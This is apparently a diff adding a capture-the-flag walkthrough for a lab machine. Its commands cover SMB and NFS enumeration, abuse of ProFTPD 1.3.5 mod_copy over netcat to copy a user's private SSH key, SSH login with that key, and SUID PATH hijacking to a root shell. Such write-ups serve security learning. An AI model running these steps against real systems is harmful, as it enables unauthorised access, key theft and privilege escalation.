@@ -1,0 +1,89 @@
+10.10.28.140
+nmap -vvv 10.10.28.140
+# enumerate smb
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.28.140
+nmap -p 139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.28.140
+# also
+enum4linux 10.10.28.140
+# login to smb
+smbclient //10.10.28.140/anonymous
+# get data
+get log.txt
+# or
+smbget -R smb://10.10.28.140/anonymous
+
+# the log file shows that kenobi user
+# the log also contains the following
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+
+# there is rpc on 111, use nmap to get more info
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.28.140
+# there is 1 share (/var)
+
+# proftpd is running on port 21, use netcat to get version
+nc 10.10.28.140 21
+# we see version is 1.3.5
+# use searchsploit to find exploits
+searchsplout proftpd | grep "1.3.5"
+# there are 4 exploits, we are interested in mod_copy
+http://www.proftpd.org/docs/contrib/mod_copy.html
+# it states
+The mod_copy module implements SITE CPFR and SITE CPTO commands (analogous to RNFR and RNTO),
+which can be used to copy files/directories from one place to another on the server without
+having to transfer the data to the client and back.
+# ok lets use netcat to implement these commands
+# we know that id id_rsa is in /home/kenobi/.ssh/id_rsa
+# lets copy it to the /var/tmp directory 
+nc 10.10.28.140 21
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+# mount the /var share and get the newly copied data
+cd /tmp
+mkdir k
+mount 10.10.28.140:/var k
+ls -al k
+cp k/tmp/id_rsa .
+# we now have the id_rsa private key
+# set permissions on key and ssh onto kenobi
+chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.28.140
+# we are now logged on as kenobi user
+# get the flag
+cat user.txt 
+# we have a foothold, lets find some files with suid in oder to escalate privilege
+find / -perm -u=s -type f 2>/dev/null
+# there are many files with a user SUID set, however /usr/bin/menu, seems unusual
+# we run it, there are 3 options
+# we run strings and we see
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+# This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+# As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+echo $PATH > oldpath
+export PATH=/tmp:$PATH
+/usr/bin/menu
+# we are now able to use option 1 (and run a /bin/sh) as root, we have already set the PATH to check /tmp
+# first (so it will find OUR curl first and execute it - even though OUR curl is in fact /bin/sh)
+**************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# run the id command to show that we are now root
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# cd /root
+# cat root.txt
+# we now have the root flag
+
+
